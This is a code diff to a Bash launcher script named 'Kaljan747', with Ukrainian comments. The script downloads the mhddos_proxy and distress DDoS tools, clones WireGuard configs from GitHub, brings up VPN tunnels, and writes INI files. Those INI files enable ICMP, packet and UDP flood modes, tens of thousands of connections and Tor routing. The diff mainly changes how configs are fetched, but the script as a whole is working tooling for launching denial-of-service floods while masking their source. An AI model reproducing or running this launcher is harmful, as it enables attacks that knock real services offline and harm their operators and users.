@@ -56,7 +56,13 @@ ask_user_id() {
 
 ask_run_parameters() {
     if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
-        USER_SELECTION=$(zenity --forms --title="Kaljan747 Конфігурація"             --text="Вкажіть параметри запуску"             --add-combo="Модуль" --combo-values="mhddos_proxy|distress"             --add-combo="Редагувати INI перед запуском?" --combo-values="Так|Ні"             --add-combo="Режим запуску" --combo-values="screen у фоні|screen відкрито|без screen"             --width=400)
+        USER_SELECTION=$(zenity --forms --title="Kaljan747 Конфігурація" \
+            --text="Вкажіть параметри запуску" \
+            --add-combo="Модуль" --combo-values="mhddos_proxy|distress" \
+            --add-combo="Редагувати INI перед запуском?" --combo-values="Так|Ні" \
+            --add-combo="Режим запуску" --combo-values="screen у фоні|screen відкрито|без screen" \
+            --width=400)
+
         [ -z "$USER_SELECTION" ] && { echo "Запуск скасовано"; exit 1; }
         IFS="|" read -r SELECTED_MODULE EDIT_INI SELECTED_RUN_MODE <<< "$USER_SELECTION"
     else
@@ -141,16 +147,41 @@ DS_URL="https://github.com/Yneth/distress-releases/releases/latest/download/dist
 [ -f "$MODULE_DIR/distress" ] || wget -qO "$MODULE_DIR/distress" "$DS_URL"
 chmod +x "$MODULE_DIR/mhddos_proxy" "$MODULE_DIR/distress"
 
-# === Решта логіки (підключення WG, генерація .ini, запуск модуля) додається окремо при бажанні ===
-
-
-# === Зупинка всіх активних WG інтерфейсів ===
+# === ЗУПИНКА ВСІХ WG ПЕРЕД ЗАПУСКОМ ===
 for iface in $(wg show interfaces 2>/dev/null); do
     $SUDO wg-quick down "$iface" 2>/dev/null || true
     $SUDO ip link delete "$iface" 2>/dev/null || true
 done
 
-# === Підключення 4 робочих тунелів ===
+# =====================================================================
+# === НОВИЙ БЛОК "ЗАВАНТАЖЕННЯ WG-КОНФІГІВ ЧЕРЕЗ GIT CLONE" ============
+# =====================================================================
+
+print_stage "🌍 Завантаження WG-конфігів (через git clone)..."
+
+TMPDIR="$(mktemp -d)"
+if git clone --depth 1 --branch k7771 https://github.com/k7771/Kaljan747.git "$TMPDIR"; then
+    mkdir -p "$WG_DIR"
+    if cp -r "$TMPDIR"/wg/* "$WG_DIR"/ 2>/dev/null; then
+        echo "✅ Конфіги скопійовано до $WG_DIR"
+    else
+        echo "❌ Папка wg пуста або відсутня у репозиторії!"
+        rm -rf "$TMPDIR"
+        exit 1
+    fi
+else
+    echo "❌ Не вдалося клонувати репозиторій!"
+    rm -rf "$TMPDIR"
+    exit 1
+fi
+
+rm -rf "$TMPDIR"
+$SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true
+
+# =====================================================================
+
+
+# === ПІДКЛЮЧЕННЯ 4 РОБОЧИХ ТУНЕЛІВ ===
 check_wg_connection() {
     curl -s --interface "$1" --max-time 5 https://api.ipify.org >/dev/null 2>&1
 }
@@ -180,7 +211,7 @@ done
 VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
 VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
 
-# === Оновлення INI файлів ===
+# === ОНОВЛЕННЯ INI ===
 echo "--use-my-ip 0 --copies auto -t 8000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
 echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"
 
@@ -196,7 +227,7 @@ if [ "$EDIT_INI" = "Так" ]; then
     fi
 fi
 
-# === Запуск модуля ===
+# === ЗАПУСК МОДУЛЯ ===
 MODULE_EXEC="$MODULE_DIR/mhddos_proxy"
 [ "$SELECTED_MODULE" = "distress" ] && MODULE_EXEC="$MODULE_DIR/distress"
 
@@ -208,38 +239,3 @@ esac
 
 print_summary "$PID"
 exit 0
-
-
-# === Завантаження WG-конфігів ===
-print_stage "🌍 Завантаження WG-конфігів..."
-WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
-WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
-
-CONF_LIST_GITHUB=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=")[^"]+\.conf(?=")' | grep "/k7771/Kaljan747/blob/" | sed -E 's|^/k7771/Kaljan747/blob/k7771/wg/||')
-
-if [ -n "$CONF_LIST_GITHUB" ]; then
-    echo "🌐 Завантаження з GitHub:"
-    for file in $CONF_LIST_GITHUB; do
-        RAW_URL="$WG_RAW_BASE/$file"
-        DEST="$WG_DIR/$(basename "$file")"
-        if ! curl -fsSL "$RAW_URL" -o "$DEST"; then
-            echo "⚠️ curl не спрацював — пробую wget..."
-            wget -qO "$DEST" "$RAW_URL" || echo "❌ Не вдалося завантажити $file"
-        else
-            echo "✅ Завантажено: $file"
-        fi
-    done
-else
-    echo "⚠️ Не вдалося отримати список .conf з GitHub — пропускаємо GitHub"
-fi
-
-CONF_LIST_LOCAL=$(find "$WG_DIR" -name "*.conf" -type f)
-
-if [ -z "$CONF_LIST_LOCAL" ]; then
-    echo "❌ Жодного .conf не знайдено навіть локально. Завершення."
-    exit 1
-else
-    echo "📂 Локальні .conf файли: $(basename -a $CONF_LIST_LOCAL | tr '\n' ' ')"
-fi
-
-$SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true
